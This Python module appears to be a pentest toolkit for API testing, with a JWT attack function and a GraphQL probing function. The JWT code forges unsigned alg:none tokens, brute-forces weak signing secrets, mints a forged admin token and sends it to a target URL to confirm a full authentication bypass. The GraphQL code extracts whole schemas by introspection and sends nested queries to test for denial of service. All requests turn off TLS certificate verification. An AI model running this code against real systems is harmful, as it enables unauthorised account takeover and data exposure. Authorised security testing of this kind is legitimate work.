"""
API Security Tools
- jwt_test: JWT token security analysis and attack testing
- graphql_test: GraphQL introspection and security testing

These tools target API-specific vulnerabilities that generic scanners miss.
JWT attacks and open GraphQL introspection are among the most common
API security findings in modern applications.
"""
import json
import ssl
import base64
import hashlib
import hmac
import time
import urllib.request
import urllib.error
from typing import Optional, Dict, List


def _make_ssl_context() -> ssl.SSLContext:
    """Permissive SSL context for targets with self-signed certs."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _http_post_json(url: str, payload: dict, headers: Optional[Dict[str, str]] = None,
                    timeout: int = 15) -> dict:
    """Send a JSON POST request and return parsed response.

    Returns dict with keys: status, headers, body (str), json (parsed or None).
    On error returns dict with 'error' key.
    """
    ctx = _make_ssl_context()
    req_headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    if headers:
        req_headers.update(headers)

    body_bytes = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=body_bytes, headers=req_headers, method="POST")

    try:
        response = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        raw = response.read(200000).decode("utf-8", errors="replace")
        parsed = None
        try:
            parsed = json.loads(raw)
        except (json.JSONDecodeError, ValueError):
            pass
        return {
            "status": response.status,
            "headers": dict(response.headers),
            "body": raw,
            "json": parsed,
        }
    except urllib.error.HTTPError as e:
        raw = ""
        try:
            raw = e.read(200000).decode("utf-8", errors="replace")
        except Exception:
            pass
        parsed = None
        try:
            parsed = json.loads(raw)
        except (json.JSONDecodeError, ValueError):
            pass
        return {
            "status": e.code,
            "headers": dict(e.headers) if e.headers else {},
            "body": raw,
            "json": parsed,
        }
    except urllib.error.URLError as e:
        return {"error": f"Connection failed: {e.reason}"}
    except Exception as e:
        return {"error": str(e)}


# =============================================================================
# jwt_test
# =============================================================================

def _b64_decode_jwt(segment: str) -> bytes:
    """Decode a JWT base64url segment with padding fix."""
    # JWT uses base64url encoding without padding
    remainder = len(segment) % 4
    if remainder:
        segment += "=" * (4 - remainder)
    return base64.urlsafe_b64decode(segment)


def _b64_encode_jwt(data: bytes) -> str:
    """Encode bytes to JWT base64url format (no padding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _hmac_sign(header_b64: str, payload_b64: str, secret: str, algorithm: str) -> str:
    """Sign a JWT with HMAC-SHA256 or HMAC-SHA384 or HMAC-SHA512."""
    algo_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_func = algo_map.get(algorithm, hashlib.sha256)
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hash_func).digest()
    return _b64_encode_jwt(signature)


def jwt_test(
    token: str,
    url: Optional[str] = None,
    timeout: int = 10,
) -> str:
    """
    JWT security testing: decode, analyze, and test for common vulnerabilities.

    Tests performed:
    1. Decode header and payload (without verification)
    2. Check for sensitive data in payload (passwords, PII, internal IDs)
    3. Check expiration (missing exp = token never expires)
    4. Test alg:none attack (signature bypass on vulnerable servers)
    5. Brute-force weak signing secrets from common list

    Args:
        token: Raw JWT string (eyJhbGciOiJIUzI1NiJ9.eyJ...) — the full token
        url: Optional endpoint to test modified tokens against.
             If provided, will send forged tokens to verify exploitability.
        timeout: Request timeout for verification requests

    Returns:
        Analysis results with any discovered vulnerabilities
    """
    token = token.strip()

    # Strip "Bearer " prefix if present
    if token.lower().startswith("bearer "):
        token = token[7:].strip()

    # Validate JWT structure
    parts = token.split(".")
    if len(parts) != 3:
        return (
            f"Error: Invalid JWT format. Expected 3 dot-separated parts, got {len(parts)}.\n"
            f"JWT format: header.payload.signature\n"
            f"Input: {token[:100]}..."
        )

    header_b64, payload_b64, signature_b64 = parts

    result_lines = [
        "JWT Security Analysis",
        "=" * 60,
        "",
    ]

    # -------------------------------------------------------------------------
    # Step 1: Decode header and payload
    # -------------------------------------------------------------------------
    try:
        header_bytes = _b64_decode_jwt(header_b64)
        header = json.loads(header_bytes)
    except Exception as e:
        return f"Error decoding JWT header: {e}\nRaw header (base64): {header_b64}"

    try:
        payload_bytes = _b64_decode_jwt(payload_b64)
        payload = json.loads(payload_bytes)
    except Exception as e:
        return f"Error decoding JWT payload: {e}\nRaw payload (base64): {payload_b64}"

    algorithm = header.get("alg", "unknown")
    token_type = header.get("typ", "JWT")
    key_id = header.get("kid", None)

    result_lines.append("Header:")
    result_lines.append(f"  {json.dumps(header, indent=2)}")
    result_lines.append("")
    result_lines.append("Payload:")
    result_lines.append(f"  {json.dumps(payload, indent=2)}")
    result_lines.append("")
    result_lines.append(f"Algorithm: {algorithm}")
    if key_id:
        result_lines.append(f"Key ID (kid): {key_id}")
    result_lines.append("")

    findings = []

    # -------------------------------------------------------------------------
    # Step 2: Check for sensitive data in payload
    # -------------------------------------------------------------------------
    sensitive_keys = [
        "password", "passwd", "pwd", "secret", "ssn", "social_security",
        "credit_card", "card_number", "cvv", "pin", "private_key",
        "api_key", "apikey", "access_key", "secret_key",
    ]
    found_sensitive = []
    for key in payload:
        if key.lower() in sensitive_keys:
            found_sensitive.append(key)
        # Also check for values that look like they shouldn't be in a JWT
        val = str(payload[key])
        if len(val) > 50 and key.lower() not in ("iat", "exp", "nbf", "jti", "iss", "aud", "sub"):
            found_sensitive.append(f"{key} (unusually long value: {len(val)} chars)")

    if found_sensitive:
        findings.append(("HIGH", "Sensitive data in JWT payload", ", ".join(found_sensitive)))
        result_lines.append("[FINDING] Sensitive data in payload:")
        for s in found_sensitive:
            result_lines.append(f"  - {s}")
        result_lines.append("  JWT payloads are base64-encoded, NOT encrypted. Anyone can read them.")
        result_lines.append("")

    # -------------------------------------------------------------------------
    # Step 3: Check expiration
    # -------------------------------------------------------------------------
    exp = payload.get("exp")
    iat = payload.get("iat")
    nbf = payload.get("nbf")

    if exp is None:
        findings.append(("MEDIUM", "No expiration (exp) claim", "Token never expires"))
        result_lines.append("[FINDING] No 'exp' claim — token never expires.")
        result_lines.append("  Stolen tokens remain valid indefinitely.")
        result_lines.append("")
    else:
        try:
            exp_int = int(exp)
            now = int(time.time())
            if exp_int < now:
                diff = now - exp_int
                result_lines.append(f"[INFO] Token expired {diff}s ago (exp={exp_int}).")
            else:
                remaining = exp_int - now
                if remaining > 86400 * 30:
                    days = remaining // 86400
                    findings.append(("LOW", "Long-lived token", f"Expires in {days} days"))
                    result_lines.append(f"[FINDING] Token valid for {days} days — consider shorter expiry.")
                else:
                    result_lines.append(f"[OK] Token expires in {remaining}s.")
            result_lines.append("")
        except (ValueError, TypeError):
            result_lines.append(f"[WARN] Could not parse exp value: {exp}")
            result_lines.append("")

    if iat:
        result_lines.append(f"Issued at (iat): {iat}")
    if nbf:
        result_lines.append(f"Not before (nbf): {nbf}")
    if iat or nbf:
        result_lines.append("")

    # -------------------------------------------------------------------------
    # Step 4: Test alg:none attack
    # -------------------------------------------------------------------------
    result_lines.append("--- Algorithm None Attack ---")

    # Build forged token with alg:none
    none_variants = [
        {"alg": "none", "typ": "JWT"},
        {"alg": "None", "typ": "JWT"},
        {"alg": "NONE", "typ": "JWT"},
        {"alg": "nOnE", "typ": "JWT"},
    ]

    forged_tokens = []
    for none_header in none_variants:
        h = _b64_encode_jwt(json.dumps(none_header).encode("utf-8"))
        p = payload_b64  # Keep original payload
        forged = f"{h}.{p}."  # Empty signature
        forged_tokens.append((none_header["alg"], forged))

    if url:
        result_lines.append(f"Testing alg:none against {url}...")
        alg_none_worked = False

        for alg_variant, forged_token in forged_tokens:
            resp = _http_post_json(
                url,
                {},
                headers={"Authorization": f"Bearer {forged_token}"},
                timeout=timeout,
            )
            if "error" in resp:
                result_lines.append(f"  alg={alg_variant}: Connection error — {resp['error']}")
                continue

            status = resp.get("status", 0)
            if status in (200, 201, 204):
                alg_none_worked = True
                findings.append(("CRITICAL", "alg:none bypass", f"Server accepted alg={alg_variant}"))
                result_lines.append(f"  [CRITICAL] alg={alg_variant}: Status {status} — SERVER ACCEPTED UNSIGNED TOKEN")
                break
            elif status in (401, 403):
                result_lines.append(f"  alg={alg_variant}: Status {status} — rejected (good)")
            else:
                result_lines.append(f"  alg={alg_variant}: Status {status} — inconclusive")

        if not alg_none_worked:
            result_lines.append("  alg:none attack rejected by server.")
    else:
        result_lines.append("  Forged tokens generated (no URL provided to test against):")
        result_lines.append(f"  alg=none: {forged_tokens[0][1][:80]}...")
        result_lines.append("  Provide 'url' parameter to test these against an endpoint.")

    result_lines.append("")

    # -------------------------------------------------------------------------
    # Step 5: Brute-force weak secrets (HMAC algorithms only)
    # -------------------------------------------------------------------------
    if algorithm.startswith("HS"):
        result_lines.append(f"--- Weak Secret Brute-Force ({algorithm}) ---")

        common_secrets = [
            "secret", "password", "123456", "key", "jwt_secret",
            "supersecret", "changeme", "admin", "test", "default",
            "your-256-bit-secret", "shhhhh", "jwt", "token",
            "my-secret", "app-secret", "SECRET_KEY", "s3cr3t",
            "keyboard_cat", "mysecret", "1234567890", "abcdefg",
            "pass", "qwerty", "letmein", "welcome", "monkey",
            "master", "hello", "private", "access", "secretkey",
        ]

        found_secret = None
        for candidate in common_secrets:
            test_sig = _hmac_sign(header_b64, payload_b64, candidate, algorithm)
            if test_sig == signature_b64:
                found_secret = candidate
                break

        if found_secret:
            findings.append(("CRITICAL", "Weak JWT signing secret", f"Secret is: {found_secret}"))
            result_lines.append(f"  [CRITICAL] Signing secret discovered: \"{found_secret}\"")
            result_lines.append(f"  Anyone with this secret can forge valid tokens with any claims.")
            result_lines.append("")

            # Generate a forged admin token as proof
            forged_payload = dict(payload)
            forged_payload["role"] = "admin"
            forged_payload["is_admin"] = True
            if "sub" in forged_payload:
                forged_payload["sub"] = "1"  # Usually admin user ID
            forged_p = _b64_encode_jwt(json.dumps(forged_payload).encode("utf-8"))
            forged_sig = _hmac_sign(header_b64, forged_p, found_secret, algorithm)
            forged_admin_token = f"{header_b64}.{forged_p}.{forged_sig}"

            result_lines.append("  Forged admin token:")
            result_lines.append(f"  {forged_admin_token}")

            if url:
                result_lines.append("")
                result_lines.append(f"  Testing forged admin token against {url}...")
                resp = _http_post_json(
                    url,
                    {},
                    headers={"Authorization": f"Bearer {forged_admin_token}"},
                    timeout=timeout,
                )
                if "error" not in resp:
                    status = resp.get("status", 0)
                    result_lines.append(f"  Forged token response: Status {status}")
                    if status in (200, 201, 204):
                        result_lines.append(f"  *** FORGED ADMIN TOKEN ACCEPTED — FULL AUTH BYPASS ***")
        else:
            result_lines.append(f"  Tested {len(common_secrets)} common secrets — none matched.")
            result_lines.append(f"  Secret appears to be non-trivial (good).")

        result_lines.append("")
    else:
        result_lines.append(f"--- Secret Brute-Force ---")
        result_lines.append(f"  Algorithm is {algorithm} (asymmetric) — HMAC brute-force not applicable.")
        if algorithm.startswith("RS") or algorithm.startswith("PS"):
            result_lines.append(f"  Consider testing: RS/PS → HS confusion attack (change alg to HS256,")
            result_lines.append(f"  sign with the public key). Requires the server's public key.")
        result_lines.append("")

    # -------------------------------------------------------------------------
    # Summary
    # -------------------------------------------------------------------------
    result_lines.append("=" * 60)
    result_lines.append("Summary:")

    if findings:
        result_lines.append(f"  {len(findings)} finding(s):")
        for severity, title, detail in findings:
            result_lines.append(f"  [{severity}] {title}: {detail}")
    else:
        result_lines.append("  No vulnerabilities found in this JWT.")
        result_lines.append("  Token structure and configuration appear secure.")

    return "\n".join(result_lines)


# =============================================================================
# graphql_test
# =============================================================================

# Standard GraphQL introspection query
_INTROSPECTION_QUERY = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          description
          fields(includeDeprecated: true) {
            name
            description
            args { name type { name kind ofType { name kind } } }
            type { name kind ofType { name kind ofType { name kind } } }
          }
        }
      }
    }
    """.strip()
}

# Simpler introspection probe (less likely to be blocked)
_INTROSPECTION_PROBE = {
    "query": "{ __schema { queryType { name } types { name kind } } }"
}

# Depth test query — nested query to check for depth limits
_DEPTH_TEST_QUERY = {
    "query": """
    query DepthTest {
      __schema {
        types {
          name
          fields {
            name
            type {
              name
              fields {
                name
                type {
                  name
                  fields {
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    """.strip()
}


def graphql_test(
    url: str,
    timeout: int = 15,
) -> str:
    """
    GraphQL endpoint security testing.

    Tests performed:
    1. Introspection query — extracts full API schema if enabled
    2. Schema analysis — identifies sensitive types, queries, and mutations
    3. Query depth limit test — checks for resource exhaustion protection
    4. Common endpoint discovery if the given URL fails

    An open introspection endpoint is always a finding — it reveals the
    entire API surface including internal queries, mutations, and data types.

    Args:
        url: GraphQL endpoint URL (e.g., "https://target.com/graphql")
        timeout: Request timeout in seconds

    Returns:
        Introspection results, schema analysis, and security findings
    """
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result_lines = [
        f"GraphQL Security Analysis: {url}",
        "=" * 60,
        "",
    ]

    findings = []

    # -------------------------------------------------------------------------
    # Step 1: Test introspection
    # -------------------------------------------------------------------------
    result_lines.append("--- Introspection Test ---")

    # Try full introspection first
    resp = _http_post_json(url, _INTROSPECTION_QUERY, timeout=timeout)

    if "error" in resp:
        # Connection failed — try common alternative paths
        result_lines.append(f"Connection to {url} failed: {resp['error']}")
        result_lines.append("")
        result_lines.append("Trying alternative GraphQL paths...")

        base_url = url.rsplit("/", 1)[0] if "/" in url.split("//", 1)[-1] else url
        alt_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query",
                     "/gql", "/graphiql", "/playground"]

        for path in alt_paths:
            alt_url = base_url.rstrip("/") + path
            if alt_url == url:
                continue
            resp = _http_post_json(alt_url, _INTROSPECTION_PROBE, timeout=timeout)
            if "error" not in resp and resp.get("status") in (200, 201):
                result_lines.append(f"  Found GraphQL at: {alt_url}")
                url = alt_url
                # Re-run full introspection on discovered endpoint
                resp = _http_post_json(url, _INTROSPECTION_QUERY, timeout=timeout)
                break
        else:
            result_lines.append("  No GraphQL endpoint found at common paths.")
            return "\n".join(result_lines)

    status = resp.get("status", 0)
    resp_json = resp.get("json")

    # Check if introspection returned schema data
    introspection_open = False
    schema_data = None

    if resp_json and "data" in resp_json:
        schema_raw = resp_json.get("data", {}).get("__schema")
        if schema_raw:
            introspection_open = True
            schema_data = schema_raw

    if not introspection_open and resp_json and "errors" in resp_json:
        # Introspection might be disabled — check error message
        errors = resp_json.get("errors", [])
        error_msgs = [e.get("message", "") for e in errors if isinstance(e, dict)]
        error_text = "; ".join(error_msgs)

        if any(kw in error_text.lower() for kw in ["introspection", "disabled", "not allowed"]):
            result_lines.append(f"[GOOD] Introspection is disabled: {error_text}")
            result_lines.append("")
        else:
            result_lines.append(f"Status: {status}")
            result_lines.append(f"Errors: {error_text}")
            result_lines.append("")

        # Try simpler probe as fallback
        resp2 = _http_post_json(url, _INTROSPECTION_PROBE, timeout=timeout)
        resp2_json = resp2.get("json")
        if resp2_json and "data" in resp2_json:
            schema_raw = resp2_json.get("data", {}).get("__schema")
            if schema_raw:
                introspection_open = True
                schema_data = schema_raw
                result_lines.append("[!] Simple introspection probe succeeded despite full query rejection.")
                result_lines.append("")

    if not introspection_open and status in (200, 201) and not schema_data:
        # Got 200 but no schema — might be returning something else
        body_preview = resp.get("body", "")[:500]
        result_lines.append(f"Status: {status} but no schema data in response.")
        result_lines.append(f"Response preview: {body_preview}")
        result_lines.append("")

    # -------------------------------------------------------------------------
    # Step 2: Analyze schema if introspection is open
    # -------------------------------------------------------------------------
    if introspection_open and schema_data:
        findings.append(("MEDIUM", "GraphQL introspection enabled",
                         "Full API schema is exposed to any client"))

        result_lines.append("[FINDING] Introspection is ENABLED — full schema extracted.")
        result_lines.append("")

        types = schema_data.get("types", [])
        query_type_name = (schema_data.get("queryType") or {}).get("name", "Query")
        mutation_type_name = (schema_data.get("mutationType") or {}).get("name")

        # Filter out built-in types (start with __)
        custom_types = [t for t in types if not t.get("name", "").startswith("__")]
        object_types = [t for t in custom_types if t.get("kind") == "OBJECT"]

        result_lines.append(f"Schema Overview:")
        result_lines.append(f"  Total types: {len(types)} ({len(custom_types)} custom)")
        result_lines.append(f"  Query type: {query_type_name}")
        result_lines.append(f"  Mutation type: {mutation_type_name or 'None'}")
        result_lines.append("")

        # List custom types with their fields
        result_lines.append("Custom Types:")
        for t in object_types[:30]:  # Cap at 30 to avoid huge output
            type_name = t.get("name", "?")
            fields = t.get("fields") or []
            field_names = [f.get("name", "?") for f in fields]

            result_lines.append(f"  {type_name}:")
            if field_names:
                result_lines.append(f"    Fields: {', '.join(field_names[:15])}")
                if len(field_names) > 15:
                    result_lines.append(f"    ... and {len(field_names) - 15} more")
            result_lines.append("")

        # Identify sensitive types/fields
        sensitive_indicators = [
            "password", "passwd", "secret", "token", "key", "credential",
            "ssn", "credit_card", "private", "internal", "admin", "role",
            "permission", "hash", "salt", "otp", "pin",
        ]

        sensitive_found = []
        for t in custom_types:
            type_name = t.get("name", "")
            for indicator in sensitive_indicators:
                if indicator in type_name.lower():
                    sensitive_found.append(f"Type: {type_name}")
                    break

            for field in (t.get("fields") or []):
                field_name = field.get("name", "")
                for indicator in sensitive_indicators:
                    if indicator in field_name.lower():
                        sensitive_found.append(f"Field: {type_name}.{field_name}")
                        break

        if sensitive_found:
            findings.append(("HIGH", "Sensitive fields in schema",
                             f"{len(sensitive_found)} potentially sensitive items"))
            result_lines.append("Potentially Sensitive Items:")
            for item in sensitive_found[:20]:
                result_lines.append(f"  [!] {item}")
            if len(sensitive_found) > 20:
                result_lines.append(f"  ... and {len(sensitive_found) - 20} more")
            result_lines.append("")

        # List mutations (potential write operations)
        if mutation_type_name:
            mutation_type = None
            for t in types:
                if t.get("name") == mutation_type_name:
                    mutation_type = t
                    break

            if mutation_type and mutation_type.get("fields"):
                mutations = mutation_type["fields"]
                result_lines.append(f"Mutations ({len(mutations)}):")
                for m in mutations[:20]:
                    m_name = m.get("name", "?")
                    args = m.get("args") or []
                    arg_names = [a.get("name", "?") for a in args]
                    result_lines.append(f"  {m_name}({', '.join(arg_names)})")

                if len(mutations) > 20:
                    result_lines.append(f"  ... and {len(mutations) - 20} more")
                result_lines.append("")

                # Flag mutations that look dangerous without auth
                dangerous_mutations = []
                for m in mutations:
                    m_name = m.get("name", "").lower()
                    if any(kw in m_name for kw in [
                        "delete", "remove", "drop", "create", "update", "modify",
                        "admin", "register", "reset_password", "change_password",
                        "elevate", "grant", "revoke",
                    ]):
                        dangerous_mutations.append(m.get("name", "?"))

                if dangerous_mutations:
                    findings.append(("HIGH", "Potentially dangerous mutations exposed",
                                     ", ".join(dangerous_mutations[:5])))
                    result_lines.append("Potentially Dangerous Mutations:")
                    for dm in dangerous_mutations:
                        result_lines.append(f"  [!] {dm} — test if accessible without authentication")
                    result_lines.append("")

        # List queries
        for t in types:
            if t.get("name") == query_type_name and t.get("fields"):
                queries = t["fields"]
                result_lines.append(f"Queries ({len(queries)}):")
                for q in queries[:20]:
                    q_name = q.get("name", "?")
                    args = q.get("args") or []
                    arg_names = [a.get("name", "?") for a in args]
                    result_lines.append(f"  {q_name}({', '.join(arg_names)})")
                if len(queries) > 20:
                    result_lines.append(f"  ... and {len(queries) - 20} more")
                result_lines.append("")
                break

    # -------------------------------------------------------------------------
    # Step 3: Query depth limit test
    # -------------------------------------------------------------------------
    result_lines.append("--- Depth Limit Test ---")

    depth_resp = _http_post_json(url, _DEPTH_TEST_QUERY, timeout=timeout)
    if "error" not in depth_resp:
        depth_status = depth_resp.get("status", 0)
        depth_json = depth_resp.get("json")

        if depth_json and "errors" in depth_json:
            depth_errors = depth_json.get("errors", [])
            depth_error_msgs = [e.get("message", "") for e in depth_errors if isinstance(e, dict)]
            if any(kw in " ".join(depth_error_msgs).lower() for kw in ["depth", "complexity", "limit"]):
                result_lines.append("[GOOD] Query depth/complexity limits are enforced.")
            else:
                result_lines.append(f"Depth query returned errors: {'; '.join(depth_error_msgs)[:200]}")
        elif depth_json and "data" in depth_json:
            findings.append(("LOW", "No query depth limits",
                             "Deeply nested queries accepted — DoS risk"))
            result_lines.append("[FINDING] No query depth limits detected — deeply nested query accepted.")
            result_lines.append("  This enables resource exhaustion attacks (GraphQL DoS).")
        else:
            result_lines.append(f"Depth test status: {depth_status} — inconclusive")
    else:
        result_lines.append(f"Depth test failed: {depth_resp['error']}")

    result_lines.append("")

    # -------------------------------------------------------------------------
    # Summary
    # -------------------------------------------------------------------------
    result_lines.append("=" * 60)
    result_lines.append("Summary:")

    if findings:
        result_lines.append(f"  {len(findings)} finding(s):")
        for severity, title, detail in findings:
            result_lines.append(f"  [{severity}] {title}: {detail}")
        result_lines.append("")
        result_lines.append("Recommendations:")
        if introspection_open:
            result_lines.append("  - Disable introspection in production")
        if any("depth" in f[1].lower() for f in findings):
            result_lines.append("  - Implement query depth and complexity limits")
        if any("mutation" in f[1].lower() for f in findings):
            result_lines.append("  - Enforce authentication on all mutations")
        if any("sensitive" in f[1].lower() for f in findings):
            result_lines.append("  - Audit sensitive fields for proper access control")
    else:
        result_lines.append("  No vulnerabilities found.")
        if not introspection_open:
            result_lines.append("  Introspection is disabled (good).")

    return "\n".join(result_lines)
